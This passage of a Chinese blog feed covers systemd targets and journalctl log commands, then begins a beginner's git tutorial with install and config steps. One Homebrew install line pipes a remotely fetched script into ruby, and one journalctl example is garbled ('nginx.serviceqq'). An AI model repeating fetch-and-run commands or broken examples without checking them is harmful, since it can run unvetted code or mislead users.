class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 切换 Target 时，默认不关闭前一个 Target 启动的进程，&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# systemctl isolate 命令改变这种行为，&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 关闭前一个 Target 里面所有不属于后一个 Target 的进程&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ sudo systemctl isolate multi-user.target&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;Target 与 传统 RunLevel 的对应关系如下。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Traditional runlevel      New target name     Symbolically linked to...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Runlevel 0           |    runlevel0.target -&amp;gt; poweroff.target&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Runlevel 1           |    runlevel1.target -&amp;gt; rescue.target&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Runlevel 2           |    runlevel2.target -&amp;gt; multi-user.target&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Runlevel 3           |    runlevel3.target -&amp;gt; multi-user.target&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Runlevel 4           |    runlevel4.target -&amp;gt; multi-user.target&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Runlevel 5           |    runlevel5.target -&amp;gt; graphical.target&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Runlevel 6           |    runlevel6.target -&amp;gt; reboot.target&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;它与init进程的主要差别如下。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;（1）默认的 RunLevel（在/etc/inittab文件设置）现在被默认的 Target 取代，位置是/etc/systemd/system/default.target，通常符号链接到graphical.target（图形界面）或者multi-user.target（多用户命令行）。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;（2）启动脚本的位置，以前是/etc/init.d目录，符号链接到不同的 RunLevel 目录 （比如/etc/rc3.d、/etc/rc5.d等），现在则存放在/lib/systemd/system和/etc/systemd/system目录。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;（3）配置文件的位置，以前init进程的配置文件是/etc/inittab，各种服务的配置文件存放在/etc/sysconfig目录。现在的配置文件主要存放在/lib/systemd目录，在/etc/systemd目录里面的修改可以覆盖原始设置。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h1 id=&quot;日志管理&quot;&gt;&lt;a href=&quot;#日志管理&quot; class=&quot;headerlink&quot; title=&quot;日志管理&quot;&gt;&lt;/a&gt;日志管理&lt;/h1&gt;&lt;p&gt;Systemd 统一管理所有 Unit 的启动日志。带来的好处就是，可以只用journalctl一个命令，查看所有日志（内核日志和应用日志）。日志的配置文件是/etc/systemd/journald.conf。&lt;br&gt;journalctl功能强大，用法非常多。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;80&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;# 查看所有日志（默认情况下 ，只保存本次启动的日志）&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ sudo journalctl&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 查看内核日志（不显示应用日志）&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ sudo journalctl -k&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 查看系统本次启动的日志&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ sudo journalctl -b&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ sudo journalctl -b -0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 查看上一次启动的日志（需更改设置）&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ sudo journalctl -b -1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 查看指定时间的日志&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ sudo journalctl --since=&amp;quot;2012-10-30 18:17:16&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ sudo journalctl --since &amp;quot;20 min ago&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ sudo journalctl --since yesterday&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ sudo journalctl --since &amp;quot;2015-01-10&amp;quot; --until &amp;quot;2015-01-11 03:00&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ sudo journalctl --since 09:00 --until &amp;quot;1 hour ago&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 显示尾部的最新10行日志&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ sudo journalctl -n&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 显示尾部指定行数的日志&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ sudo journalctl -n 20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 实时滚动显示最新日志&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ sudo journalctl -f&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 查看指定服务的日志&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ sudo journalctl /usr/lib/systemd/systemd&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 查看指定进程的日志&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ sudo journalctl _PID=1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 查看某个路径的脚本的日志&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ sudo journalctl /usr/bin/bash&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 查看指定用户的日志&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ sudo journalctl _UID=33 --since today&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 查看某个 Unit 的日志&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ sudo journalctl -u nginx.service&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ sudo journalctl -u nginx.service --since today&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 实时滚动显示某个 Unit 的最新日志&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ sudo journalctl -u nginx.service -f&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 合并显示多个 Unit 的日志&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ journalctl -u nginx.service -u php-fpm.service --since today&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 查看指定优先级（及其以上级别）的日志，共有8级&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 0: emerg&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 1: alert&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 2: crit&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 3: err&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 4: warning&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 5: notice&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 6: info&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 7: debug&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ sudo journalctl -p err -b&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 日志默认分页输出，--no-pager 改为正常的标准输出&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ sudo journalctl --no-pager&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 以 JSON 格式（单行）输出&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ sudo journalctl -b -u nginx.service -o json&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 以 JSON 格式（多行）输出，可读性更好&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ sudo journalctl -b -u nginx.serviceqq&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; -o json-pretty&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 显示日志占据的硬盘空间&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ sudo journalctl --disk-usage&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 指定日志文件占据的最大空间&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ sudo journalctl --vacuum-size=1G&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 指定日志文件保存多久&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ sudo journalctl --vacuum-time=1years&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;a href=&quot;http://www.ruanyifeng.com/blog/2016/03/systemd-tutorial-commands.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;原文链接1&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;http://www.ruanyifeng.com/blog/2016/03/systemd-tutorial-part-two.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;原文链接2&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;Linux系统的初始化过程：POST加电自检–&amp;gt;BIOS(Boot Sequence)–&amp;gt;加载对应引导上的MBR(bootloader)–&amp;gt;主引导设置加载其BootLoader–&amp;gt;Kernel初始化。Kernel初始化后，就是启动init系统，初始化随系统启动的各种服务。这个init系统有以下几种：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;systemvinit&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;upstart，就是常见的/etc/init.d下的脚本&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;systemd，一代更比一代强，这就是我们接下来要介绍的。在CoreOS,ubuntu15.04及以上版本中有使用。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="Linux" scheme="http://adu.404nf.cn/categories/Linux/"/>
    
    
      <category term="Linux" scheme="http://adu.404nf.cn/tags/Linux/"/>
    
      <category term="Systemd" scheme="http://adu.404nf.cn/tags/Systemd/"/>
    
  </entry>
  
  <entry>
    <title>程序员入门之git</title>
    <link href="http://adu.404nf.cn/2016/05/29/%E7%A8%8B%E5%BA%8F%E5%91%98%E5%85%A5%E9%97%A8%E4%B9%8Bgit/"/>
    <id>http://adu.404nf.cn/2016/05/29/程序员入门之git/</id>
    <published>2016-05-29T02:49:08.000Z</published>
    <updated>2016-06-20T14:27:14.000Z</updated>
    
    <content type="html">&lt;h1 id=&quot;代码版本管理工具&quot;&gt;&lt;a href=&quot;#代码版本管理工具&quot; class=&quot;headerlink&quot; title=&quot;代码版本管理工具&quot;&gt;&lt;/a&gt;代码版本管理工具&lt;/h1&gt;&lt;p&gt;在生产环境下的开发过程中，一个工程的代码通常是有多个程序员协同完成，这就涉及到代码在不通终端的同步问题，基于此需求，我们产生了代码版本工具，目前比较主流的两种为git和SVN&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;git-与-SVN&quot;&gt;&lt;a href=&quot;#git-与-SVN&quot; class=&quot;headerlink&quot; title=&quot;git 与 SVN&quot;&gt;&lt;/a&gt;git 与 SVN&lt;/h2&gt;&lt;p&gt;关于git和SVN的区别，网上有很多，根据笔者使用的经验，感觉git还是要比SVN先进一些，首先git是一个分布式版本管理系统，SVN更像是一个储存代码的仓库，管理员可以给不同的代码提交者提供不同的权限，仅此而已。git于SVN相比明显的优势在于不依赖网络，对分支管理有更好的支持，命令行简介好用（SVN也有命令行工具，但很多公司还是采用图形化界面）&lt;/p&gt;
&lt;h2 id=&quot;git介绍&quot;&gt;&lt;a href=&quot;#git介绍&quot; class=&quot;headerlink&quot; title=&quot;git介绍&quot;&gt;&lt;/a&gt;git介绍&lt;/h2&gt;&lt;p&gt;git是Linux的创始人Linus于2005年花了大概两周时间用C语言编写的分布式版本控制系统。&lt;/p&gt;
&lt;h2 id=&quot;git使用&quot;&gt;&lt;a href=&quot;#git使用&quot; class=&quot;headerlink&quot; title=&quot;git使用&quot;&gt;&lt;/a&gt;git使用&lt;/h2&gt;&lt;h3 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; title=&quot;安装&quot;&gt;&lt;/a&gt;安装&lt;/h3&gt;&lt;p&gt;在控制台输入git 如果弹出提示信息，则跳过此步骤&lt;/p&gt;
&lt;h4 id=&quot;mac&quot;&gt;&lt;a href=&quot;#mac&quot; class=&quot;headerlink&quot; title=&quot;mac&quot;&gt;&lt;/a&gt;mac&lt;/h4&gt;&lt;p&gt;可以使用homebrew安装&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;brew install git&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;homebrew作为程序员mac的标配，如果你还没有安装，请键入：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;/usr/bin/ruby -e &amp;quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;也可以安装xcode，自带git&lt;/p&gt;
&lt;h4 id=&quot;windows&quot;&gt;&lt;a href=&quot;#windows&quot; class=&quot;headerlink&quot; title=&quot;windows&quot;&gt;&lt;/a&gt;windows&lt;/h4&gt;&lt;p&gt;到官网下载安装:&lt;br&gt;&lt;a href=&quot;http://msysgit.github.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://msysgit.github.com/&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;Linux&quot;&gt;&lt;a href=&quot;#Linux&quot; class=&quot;headerlink&quot; title=&quot;Linux&quot;&gt;&lt;/a&gt;Linux&lt;/h4&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;yum install git-core&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;或者：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;apt-get install git&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;配置&quot;&gt;&lt;a href=&quot;#配置&quot; class=&quot;headerlink&quot; title=&quot;配置&quot;&gt;&lt;/a&gt;配置&lt;/h3&gt;&lt;p&gt;在命令行输入：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;git config --global user.name &amp;quot;Your Name&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git config --global user.email &amp;quot;email@example.com&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;改配置用于识别代码提交者身份&lt;/p&gt;
&lt;h3 id=&quot;使用&quot;&gt;&lt;a href=&quot;#使用&quot; class=&quot;headerlink&quot; title=&quot;使用&quot;&gt;&lt;/a&gt;使用&lt;/h3&gt;&lt;h4 id=&quot;代码提交&quot;&gt;&lt;a href=&quot;#代码提交&quot; class=&quot;headerlink&quot; title=&quot;代码提交&quot;&gt;&lt;/a&gt;代码提交&lt;/h4&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;git init   #创建代码版本库&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git add .  #将当前目录下所有文件加入版本库&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git commit -m &amp;quot;message&amp;quot;  #提交代码&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
